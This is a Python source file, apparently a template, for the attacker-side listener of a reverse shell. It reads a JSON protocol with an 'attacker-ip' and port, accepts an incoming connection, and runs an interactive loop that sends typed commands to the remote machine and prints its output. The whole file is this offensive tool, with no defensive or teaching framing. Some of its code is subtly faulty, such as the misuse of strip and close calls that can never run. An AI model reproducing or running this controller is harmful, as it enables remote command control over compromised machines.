if __name__ == "__main__": pass







# [begin-insert: imports] #



import socket
import json



# [end-insert: imports] #







# [begin-insert: before-main] #



def receive_data(context):
	suffix = context.get("protocol").get("message-suffix")
	context["data"] = ""
	while not context.get("data").endswith(suffix):
		context["data"] += context.get("connection").recv(context.get("protocol").get("buffer-size")).decode()
	return context.get("data").strip(suffix)



def handle_error(context, error_message):
	print(f"ERROR: {error_message}")
	if context and context.get("socket"): context.get("socket").close()
	if context and context.get("connection"): context.get("connection").close()
	exit()



# [end-insert: before-main] #







# [begin-insert: main] #



def __main():
	eval("main()")

	___INSERTED_PROTOCOL___new___ = None
	if not "___INSERTED_PROTOCOL___" in globals(): handle_error(None, "No protocol inserted.")
	___INSERTED_PROTOCOL___new___ = globals().get("___INSERTED_PROTOCOL___")



	context = {}

	context["protocol"] = json.loads(___INSERTED_PROTOCOL___new___)
	context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



	protocol, buffer_size, attacker_ip, acceptable_ports, sock, suffix, normal_sub_proto = None, None, None, None, None, None, None

	try:
		protocol = context.get("protocol")
		buffer_size = protocol.get("buffer-size")
		attacker_ip = protocol.get("attacker-ip")
		acceptable_ports = protocol.get("acceptable-ports")
		sock = context.get("socket")
		suffix = protocol.get("message-suffix")
		normal_sub_proto = protocol.get("normal-sub-protocol")
	except: pass



	if not protocol: handle_error(context, "Protocol file was found but `json.loads` failed.")

	if not buffer_size: handle_error(context, "Invalid protocol: `buffer-size` is not defined.")

	if protocol.get("fallback-ip"): handle_error(context, "Invalid protocol: `fallback-ip` has not been implemented yet.")

	if not attacker_ip: handle_error(context, "Invalid protocol: `attacker-ip` is not defined.")
	if not acceptable_ports: handle_error(context, "Invalid protocol: `acceptable-ports` is not defined.")
	if len(acceptable_ports) != 1:
		handle_error(context, "Invalid protocol: the feature for multiple `acceptable-ports` has not been implemented yet.")

	if not sock: handle_error(context, "Socket could not be created.")

	if not normal_sub_proto: handle_error(context, "Invalid protocol: `normal-sub-protocol` is not defined.")
	if not normal_sub_proto.get("function-configurations"):
		handle_error(context, "Invalid protocol: `function-configurations` is not defined within `normal-sub-protocol`.")



	sock.bind(("0.0.0.0", acceptable_ports[0]))
	sock.listen(1)

	context["connection"], context["address"] = sock.accept()



	connection, address = context.get("connection"), context.get("address")



	if protocol.get("handshake-sub-protocol"):
		hs_sub_proto = protocol.get("handshake-sub-protocol")

		if not hs_sub_proto.get("server"): handle_error(context, "Invalid handshake sub-protocol: `server` is not defined.")
		if not hs_sub_proto.get("client"): handle_error(context, "Invalid handshake sub-protocol: `client` is not defined.")

		hs_server_proto = hs_sub_proto.get("server")
		hs_client_proto = hs_sub_proto.get("client")

		if not hs_server_proto.get("unconditional-sequence"):
			handle_error(context, "Invalid handshake sub-protocol: `unconditional-sequence` is not defined within `server`.")

		if not hs_client_proto.get("unconditional-sequence"):
			handle_error(context, "Invalid handshake sub-protocol: `unconditional-sequence` is not defined within `client`.")
		
		for message in hs_client_proto.get("unconditional-sequence"):
			connection.send(message.encode())
			data = connection.recv(buffer_size)
			break # for now



	while True:
		command = input("# ")
		connection.send(f"{command}{suffix}".encode())
		context["data"] = receive_data(context)
		data = context.get("data")
		print(data)



	connection.close()
	sock.close()



# [end-insert: main] #